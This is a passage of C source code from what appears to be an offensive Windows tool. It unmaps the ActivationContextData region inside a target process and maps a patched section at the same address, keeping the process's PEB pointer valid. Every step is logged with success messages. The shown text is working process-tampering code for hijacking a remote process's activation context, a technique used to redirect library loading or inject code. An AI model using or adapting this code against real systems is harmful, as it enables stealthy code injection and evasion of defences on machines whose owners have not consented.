    printf("[SUCCESS] Patched blob written to section (%zu bytes)\n", actCtxSize);

    // Unmap the original kernel-mapped ActivationContextData region
    status = pNtUnmapViewOfSection(hProcess, originalAddr);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtUnmapViewOfSection (original) failed: 0x%08lX\n", status);
        CloseHandle(hSection);
        return status;
    }
    printf("[SUCCESS] Original Activation Context region unmapped @ %p\n", originalAddr);

    // Remap our section at the exact same address - PEB pointer stays valid
    PVOID remoteBase = originalAddr;
    SIZE_T remoteViewSize = 0;
    status = pNtMapViewOfSection(hSection, hProcess, &remoteBase, 0, 0, NULL, &remoteViewSize, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtMapViewOfSection (remote) failed: 0x%08lX\n", status);
        CloseHandle(hSection);
        return status;
    }
    printf("[SUCCESS] Patched Activation Context mapped at %p (same address)\n", remoteBase);

    CloseHandle(hSection);
    return STATUS_SUCCESS;
}